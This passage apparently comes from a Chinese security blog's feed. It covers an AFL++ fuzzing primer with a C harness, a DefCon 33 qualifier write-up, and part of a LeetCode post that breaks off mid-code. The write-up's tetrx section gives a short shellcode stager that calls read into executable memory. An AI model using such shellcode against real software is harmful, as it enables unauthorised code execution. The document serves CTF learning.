class="lvl-2"><p>顺序化的内核崩溃调试/vmcore分析逻辑</p></li></ul><p>wjg：</p><ul class="lvl-0"><li class="lvl-2"><p>手动化 从一个配置 源码-&gt;build-&gt;测试poc-&gt;崩溃-&gt;</p></li></ul><p>wzx:</p><ul class="lvl-0"><li class="lvl-2"><p>ai</p></li></ul><p>1 2 3 4</p><h2 id="论文内容">论文内容</h2><p>对于每个人实现的内容论文中要写：</p><ul class="lvl-0"><li class="lvl-2"><p>特色描述</p></li><li class="lvl-2"><p>模块设计测试？？？？</p></li></ul><p>系统设计最后再说</p><p>图架构图</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;最近更新2025-04-05，基于ChatDBG和kdump-gdbserver实现了python便利地获取调试信息。最近更新2025-04-17，对脚本做了进一步封装且尝试新的思路最近更新2025-4-24，记录了思路的变化，现在思路从clang</summary>
      
    
    
    
    <category term="others" scheme="https://zjw1nd.github.io/categories/others/"/>
    
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
    <category term="develop" scheme="https://zjw1nd.github.io/tags/develop/"/>
    
  </entry>
  
  <entry>
    <title>从0开始的AFL++</title>
    <link href="https://zjw1nd.github.io/2025/04/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84AFLPlusPlus/"/>
    <id>https://zjw1nd.github.io/2025/04/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84AFLPlusPlus/</id>
    <published>2025-04-30T07:42:49.000Z</published>
    <updated>2025-07-22T08:48:54.074Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>📖学习路线 AFL++ -&gt; LibAFL</p></blockquote><h1>安装和使用以及基本概念</h1><p>arch一键allin就行。</p><p>afl++是一个基于afl的改进版开源模糊测试工具。对于fuzz来说，分为有源码和无源码的版本。afl基于clang实现了一个定制的编译器<code>afl-clang</code>系列。afl-clang能通过编译时插桩来为afl提供代码覆盖率监控等功能。同时它还有qemu mode能提供无源码fuzz，</p><p>有一个<a href="https://github.com/mykter/afl-training">afl-training</a>项目可以帮我们上手掌握相关的内容，这里以quckstart为例简单介绍afl++执行的入门流程。</p><h2 id="Quickstart">Quickstart</h2><p>在有源码（c）的情况下，我们要使用<code>CC=afl-clang-fast</code>来编译我们需要测试的程序。在afl编译器完成插桩编译之后，执行<code>afl-fuzz -i inputs -o out ./vulnerable</code>即可。<code>-i</code>指定了输入种子的文件夹，<code>-o</code>指定了崩溃输出的文件夹。快速启动就这么容易。我们应当看到如下内容：<br><img src="images/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84AFLPlusPlus.md/afl-screenshot.png" alt="alt text"></p><p>如果不做任何处理，afl默认会对标准输入进行fuzz。</p><h2 id="Harness">Harness</h2><p>harness的英文正式翻译是“系带/（马）挽具”或是“控制/利用…的动力”。在fuzz中指的是一个“接口”。AFL并不知道我们具体要测试什么函数，也不知道函数的输入是什么样的如何输入，因此这就需要我们编写harness。</p><p>对于fuzz一个接口/函数需要准备什么，afl-training给出了以下三条：</p><ol><li class="lvl-3"><p>代码需要是可执行的——需要编译成一个程序。</p></li><li class="lvl-3"><p>为了让 AFL 有效工作，代码需要被插桩（instrumented）——所以我们必须用 afl-clang-fast、afl-clang 或 afl-gcc 之一进行编译。</p></li><li class="lvl-3"><p>为了让 AFL 生成的数据真正测试到库函数，我们需要编写一个 harness，它能接收外部输入并传递给库。这可以通过命令行指定的文件，或者直接从标准输入（stdin）读取。</p></li></ol><p>所以我们编写harness的过程，其实是想办法让标准输入缓冲区和目标函数对接，并且在终端更加用户友好。对于一个标准的harness示例，我们现在要尝试fuzz自定义的<code>lib_echo</code>和<code>lib_mul</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;library.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基于对目标函数最大可能输入大小的假设，定义固定大小的缓冲区</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>((argc == <span class="number">2</span>) &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;echo&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 确保缓冲区初始化，消除与输入无关的变量行为</span></span><br><span class="line">        <span class="type">char</span> input[SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ssize_t</span> length;</span><br><span class="line">        length = read(STDIN_FILENO, input, SIZE);</span><br><span class="line"></span><br><span class="line">        lib_echo(input, length);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((argc == <span class="number">2</span>) &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;mul&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> a,b = <span class="number">0</span>;</span><br><span class="line">        read(STDIN_FILENO, &amp;a, <span class="number">4</span>);</span><br><span class="line">        read(STDIN_FILENO, &amp;b, <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, lib_mul(a,b));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s mul|echo\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们只需要调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i in -o out ./harness echo</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i in -o out ./harness mul</span><br></pre></td></tr></table></figure><p>就能让afl对这两个函数做fuzz。而这个主函数就是我们写的harness。</p><h2 id="注意事项">注意事项</h2><p>一般来说，终端执行afl-fuzz如果报错它会输出错误原因的。</p><h2 id="常见的参数">常见的参数</h2><p>@@： 占位符</p><blockquote><p><a href="https://cloud.tencent.com/developer/article/2483298">https://cloud.tencent.com/developer/article/2483298</a><br>qemu纯二进制下，关于fuzz的调优。比如设置afl入口点，选择要覆盖的动态库，设定code起止地址。也就是说我们通过逆向+设定一大堆环境变量也可以实现针对性的fuzz</p></blockquote><h1>原理</h1><p>这是afl++的架构图：<br><img src="images/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84AFLPlusPlus.md/overview.svg" alt="alt text"></p><h1>实战尝试</h1><h1>LibAFL</h1><p>LibAFL是一个用rust编写的fuzzing工具，提供了高自定义的很多工具用于构建自己的fuzz环境。</p><h1>golibafl</h1><h1>fuzz101</h1><p>这是一套fuzz的教程</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;📖学习路线 AFL++ -&amp;gt; LibAFL&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;安装和使用以及基本概念&lt;/h1&gt;
&lt;p&gt;arch一键allin就行。&lt;/p&gt;
&lt;p&gt;afl++是一个基于afl的改进版开源模糊测试工具。对于fuzz来说</summary>
      
    
    
    
    <category term="Exploits" scheme="https://zjw1nd.github.io/categories/Exploits/"/>
    
    
    <category term="fuzz" scheme="https://zjw1nd.github.io/tags/fuzz/"/>
    
    <category term="exploit" scheme="https://zjw1nd.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>DefCon33 Qual</title>
    <link href="https://zjw1nd.github.io/2025/04/14/DefCon33-Qual/"/>
    <id>https://zjw1nd.github.io/2025/04/14/DefCon33-Qual/</id>
    <published>2025-04-14T03:07:52.000Z</published>
    <updated>2025-04-22T02:30:02.336Z</updated>
    
    <content type="html"><![CDATA[<p>跟着nu1l的大佬们打了defcon预选。这是一周之后的记录了。队伍里没啥人来，和nu1l的大跌们和做了一把（虽然只是简单题）。</p><h2 id="关于题目风格">关于题目风格</h2><p>首先，defcon很明显的，题目的种类很多而且<strong>很新</strong>。很多东西都很小众变态。</p><p>而且常规题目是不提供类型的，除了web以外剩下的多多少少都很综合（观察频道中的师傅们交流得出的结论）。我自己做的两道题目感觉非常misc，俄罗斯方块那道题很好玩。</p><h2 id="关于我参与的题目">关于我参与的题目</h2><p>Nu1l的师傅们很厉害而且人多，各个还都是48h连轴转的多线程精力怪物，很多题开题没有跟着做也就没必要讨论了（）。我看的两道题恰好还都是misc，有一个出的很好玩。</p><h3 id="tetrx">tetrx</h3><p>题不难但是很有意思，逆向分析可以发现这玩意实现了一个终端俄罗斯方块，同时用一块0x30的，mmap出来的bitmap存储当前的地形状态信息。</p><p>很简单的测试跑完就会发现报错segfault，跟进一下就可以知道，这个bitmap给了可执行权限。在失败之后会直接去执行这块地址！换句话说，只需要一个<strong>精简且合适</strong>的shellcode，然后通过玩俄罗斯方块的形式，就能直接执行sc，甚至这个程序还给了后门。</p><p>但是大家一尝试就发现了，平常的shellcode（比如精简版的pwntools提供的那种）随随便便就会超长度，也就是上方根本没空间给我们做操作，所以需要比较巧妙的sc。硬编码的字符串肯定就不要想了。而且0也要尽可能地少。</p><p>调试过程中，本来想使用寄存器+sub/add调整到后门直接jmp，但是没有合适的寄存器。而且add和sub立即数指令会导致0太多，不好构造。</p><p>然后思路就转向了重新写，即想办法调read，自己控制这片rwx内存。同时使用pop从栈上拿当前位置的地址，然后xor rdi。</p><p>没想到Nu1l里面还有俄罗斯方块大神（）给地形就能构造这一块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line">pop rdx</span><br><span class="line">pop rdi</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">xor edi,edi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>用类似这样的asm格式构造俄罗斯方块就行。</p><h3 id="im-pio-ssible">im-pio-ssible</h3><p>首先，附件就直接且只提供了源代码，是一个我没听说过的语言<code>swift</code>，是mac上用的。直接AI读源码，发现这玩意实现了两个PIO通信，PIO这玩意全名是可编程IO，是树莓派上的一个专用模块，类似dma，是可以基于时钟独立控制的IO模块。</p><p>这里是<a href="https://dazzlingokami.github.io/2025/03/08/PIO%E5%8F%82%E8%80%83%E6%89%8B%E5%86%8C/">手册</a>，这玩意谁tm会，不过还好它的汇编指令就9条，现学+AI给翻译脚本，很快也能掌握。</p><p>远程有三个json文件，每一个都描述了一个发送数据的目标PIO，通过一个就会进下一个。题目会为每个发送方随机化7个16位数据放在PIO的FIFO存储中，我们需要通过分析配置和时钟匹配，来创建自己的接收方PIO，并且以json格式传进去。发送方的输出FIFO和我们接收方的输入FIFO是一个，只要FIFO内成功接收了这些数据，通过了校验就会给flag。</p><p>二进制文件太捞了，源码中实现了DEBUG的信息输出但是没定义开启，如果有一个debug环境就会好很多。另一个师傅找到了一个swift的docker，在docker里编译，开debug，就能本地观察到每条指令执行和PIO的情况了。</p><p>一个小插曲是，出题人的程序写错了，将FIFO写成了LIFO。但是最后的结果检查还是用的错误的API，结果就导致顺序其实也没错。刚开始另一个师傅在调试信息发现顺序是烂的之后放弃了，结果有队交了这个题，仔细看了看让我审出来接着做了。</p><p>三个关卡的内容方向也有点不一样。</p><p>第一个是简单引脚读，开了共享引脚，将数据循环按1位从一个引脚输出。逆完指令集之后做时钟同步从引脚读就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">program = [</span><br><span class="line">        PIOAssembler.<span class="built_in">set</span>(<span class="number">2</span>,<span class="number">7</span>, sideset=<span class="number">28</span>),  <span class="comment"># set y = 7</span></span><br><span class="line">        PIOAssembler.<span class="built_in">set</span>(<span class="number">1</span>,<span class="number">15</span>, sideset=<span class="number">22</span>),  <span class="comment"># set x = 15</span></span><br><span class="line">        PIOAssembler.<span class="built_in">set</span>(<span class="number">1</span>,<span class="number">15</span>, sideset=<span class="number">23</span>),  <span class="comment"># set x = 15</span></span><br><span class="line">        PIOAssembler.in_op(<span class="number">0</span>, <span class="number">1</span>, <span class="number">30</span>),</span><br><span class="line">        PIOAssembler.jmp(<span class="number">2</span>, <span class="number">3</span>, sideset=<span class="number">17</span>),</span><br><span class="line">        PIOAssembler.jmp(<span class="number">4</span>, <span class="number">1</span>, sideset=<span class="number">16</span>), <span class="comment"># Y--</span></span><br><span class="line">        PIOAssembler.wait(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>第二关开始上难度了。它会先拉取两次数据，然后拿这两个数据做双层循环的计数变量。了解了下swift语法并且逆了下具体的指令实现，发现X和Y寄存器虽然是Uint但是没有判断，jmp x–这种指令会有uint的整数环绕，因此无论如何都会push y-x进去。所以最后理论上拿到x和y-x可以还原y。但是负数太大会爆，因此算两个数x-y和~(x-y)这种就能做。</p><p>第三关则是最抽象的，时钟侧信道。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;type&#x27;: &#x27;PULL&#x27;, &#x27;if_empty&#x27;: 0, &#x27;block&#x27;: 1, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;OUT&#x27;, &#x27;dest&#x27;: &#x27;PINS&#x27;, &#x27;bitcount&#x27;: 32, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;IN&#x27;, &#x27;src&#x27;: &#x27;PINS&#x27;, &#x27;bitcount&#x27;: 2, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;MOV&#x27;, &#x27;dest&#x27;: &#x27;Y&#x27;, &#x27;op&#x27;: &#x27;&#x27;, &#x27;src&#x27;: &#x27;ISR&#x27;, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;JMP&#x27;, &#x27;cond&#x27;: &#x27;Y--&#x27;, &#x27;addr&#x27;: 4, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 delay: 5 sideset: 5&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;SET&#x27;, &#x27;dest&#x27;: &#x27;PINS&#x27;, &#x27;data&#x27;: 0, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;IN&#x27;, &#x27;src&#x27;: &#x27;PINS&#x27;, &#x27;bitcount&#x27;: 32, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;MOV&#x27;, &#x27;dest&#x27;: &#x27;PINS&#x27;, &#x27;op&#x27;: &#x27;&#x27;, &#x27;src&#x27;: &#x27;NULL&#x27;, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;PUSH&#x27;, &#x27;if_full&#x27;: 0, &#x27;block&#x27;: 1, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 delay: 10 sideset: 10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>它将数据读取到32个引脚之后，用set抹去了两位（置为0了）。然后这两位会做为变量去jmp循环。所以我们只要从时钟对齐拿到循环次数就能推算出这缺的两位是多少。</p><p>问题是怎么去标记这个起止时间。最后的想法是利用autopull机制，自动拉取数据（不用手动拉取，并且省时钟），然后用jmp判断OSR寄存器是否为空来决定什么时候开始计时。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">program = [</span><br><span class="line">        asm.set(DstReg.Y, 7),  # set Y = 3</span><br><span class="line">        asm.set(DstReg.X, 11), </span><br><span class="line">        asm.label(&quot;start&quot;),</span><br><span class="line">        asm.jmp(Cond.X_DEC_NZ, &quot;start&quot;),  # jmp x--</span><br><span class="line">        # 原始状态机中第 9条指令执行后即push 数据</span><br><span class="line">        # autopull 需要在第9条指令后第10条指令前才能自动获取数据</span><br><span class="line">        # ins count: 10</span><br><span class="line">        asm.jmp(Cond.OSRE, &quot;n_0&quot;),  # osr 非空则跳转, n=0</span><br><span class="line">        asm.set(DstReg.X, 0, sideset=5),</span><br><span class="line">        asm.jmp(Cond.OSRE, &quot;n_1&quot;),  # osr 非空则跳转, n=1</span><br><span class="line">        asm.set(DstReg.X, 0, sideset=5),</span><br><span class="line">        asm.jmp(Cond.OSRE, &quot;n_2&quot;),  # osr 非空则跳转, n=2</span><br><span class="line">        asm.set(DstReg.X, 0, sideset=5),</span><br><span class="line">        # n=3</span><br><span class="line">        asm.out(DstReg.PINS, 32),</span><br><span class="line">        asm.set(DstReg.PINS, 3),</span><br><span class="line">        asm.jmp(Cond.ALWAYS, &quot;n_end&quot;),</span><br><span class="line">        # n=2</span><br><span class="line">        asm.label(&quot;n_2&quot;),</span><br><span class="line">        asm.out(DstReg.PINS, 32),</span><br><span class="line">        asm.set(DstReg.PINS, 2),</span><br><span class="line">        asm.jmp(Cond.ALWAYS, &quot;n_end&quot;),</span><br><span class="line">        # n=1</span><br><span class="line">        asm.label(&quot;n_1&quot;),</span><br><span class="line">        asm.out(DstReg.PINS, 32),</span><br><span class="line">        asm.set(DstReg.PINS, 1),</span><br><span class="line">        asm.jmp(Cond.ALWAYS, &quot;n_end&quot;),</span><br><span class="line">        # n=0</span><br><span class="line">        asm.label(&quot;n_0&quot;),</span><br><span class="line">        asm.out(DstReg.PINS, 32),</span><br><span class="line">        asm.label(&quot;n_end&quot;),</span><br><span class="line">        asm.mov(DstReg.ISR, MovOp.NONE, SrcReg.PINS),</span><br><span class="line">        asm.push(),</span><br><span class="line">        asm.mov(DstReg.PINS, MovOp.NONE, SrcReg.NULL),</span><br><span class="line">        asm.wait(1, 1, 0),</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h2 id="一些总结">一些总结</h2><p>48h连轴转首先肯定不是专门打或者有一个人很多的team肯定遭不住，打高分肯定是要连轴转的。另外这些师傅是真的nb。</p><p>defcon qual的题目风格和国内差的挺多的，感觉重点都是技术本身而不是国内这种卷更加复杂的板子利用，比如去符号的rust之类。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;跟着nu1l的大佬们打了defcon预选。这是一周之后的记录了。队伍里没啥人来，和nu1l的大跌们和做了一把（虽然只是简单题）。&lt;/p&gt;
&lt;h2 id=&quot;关于题目风格&quot;&gt;关于题目风格&lt;/h2&gt;
&lt;p&gt;首先，defcon很明显的，题目的种类很多而且&lt;strong&gt;很新&lt;/st</summary>
      
    
    
    
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm-leetcode</title>
    <link href="https://zjw1nd.github.io/2025/04/07/Algorithm-leetcode/"/>
    <id>https://zjw1nd.github.io/2025/04/07/Algorithm-leetcode/</id>
    <published>2025-04-07T07:18:55.000Z</published>
    <updated>2025-04-27T03:25:39.555Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>lc的输入传引用，并且无需自己设计输入输出格式，只需要实现核心函数即可</p></blockquote><p>考虑在每个方向上都做1-2道题。</p><h1>数组操作</h1><p>1-3：数组操作，双指针为主，C++上学期考完csp已经手生了，不会用vec了。需要利用有序信息。保留连续两个重复元素，有序数组，不额外开空间：</p><p>双指针一个用于遍历搜索，另一个用于标记修改位置，通用思路</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeDuplicates</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 试一下上一题的快慢指针</span></span><br><span class="line">        <span class="comment">// 数组有序，如果有需要删除的元素，那么在首次遍历到这个元素之后+2肯定不会漏</span></span><br><span class="line">        <span class="comment">// 不让开新数组？</span></span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">2</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="type">int</span> fast=<span class="number">2</span>,slow=<span class="number">2</span>;<span class="comment">// 0,1直接保留不用看</span></span><br><span class="line">        <span class="keyword">while</span>(fast &lt; n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast]!=nums[slow<span class="number">-2</span>])<span class="comment">//无</span></span><br><span class="line">                nums[slow++]=nums[fast];</span><br><span class="line">            fast++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-多数元素-数组统计">4 多数元素 数组统计</h2><p>统计指标相关的问题最暴力的就是hashmap一对一，比如找多数元素。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">majorityElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; counts;</span><br><span class="line">        <span class="type">int</span> majority = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num: nums) &#123;</span><br><span class="line">            ++counts[num];</span><br><span class="line">            <span class="keyword">if</span> (counts[num] &gt; cnt) &#123;</span><br><span class="line">                majority = num;</span><br><span class="line">                cnt = counts[num];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> majority;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>多数元素的问题：hashmap，摩尔投票（新鲜），排序取中间，随机摩尔投票是一个专门解决绝对众数的算法。具有On的时间复杂度和O1的空间复杂度，效率比较高。</p><p>初始化： 票数统计 votes = 0 ， 众数 x。循环： 遍历数组 nums 中的每个数字 num 。当 票数 votes 等于 0 ，则假设当前数字 num 是众数。当 num = x 时，票数 votes 自增 1 ；当 num != x 时，票数 votes 自减 1 。返回值： 返回 x 即可。正确性略</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">majorityElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>, votes = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums)&#123;</span><br><span class="line">            <span class="keyword">if</span> (votes == <span class="number">0</span>) x = num;</span><br><span class="line">            votes += (num == x ? <span class="number">1</span> : <span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="5-轮转数组">5 轮转数组</h2><p>额外空间略，关注原地算法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法一：交换。比较符合直觉的O1思路。不过需要遍历的轮数gcd(k,n)是推导的结果</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        k = k % n;</span><br><span class="line">        <span class="type">int</span> count = <span class="built_in">gcd</span>(k, n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> start = <span class="number">0</span>; start &lt; count; ++start) &#123;</span><br><span class="line">            <span class="type">int</span> current = start;</span><br><span class="line">            <span class="type">int</span> prev = nums[start];</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="type">int</span> next = (current + k) % n;</span><br><span class="line">                <span class="built_in">swap</span>(nums[next], prev);</span><br><span class="line">                current = next;</span><br><span class="line">            &#125; <span class="keyword">while</span> (start != current);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 方法2: 巧妙的思路，最后的k%n个元素会变到开头</span></span><br><span 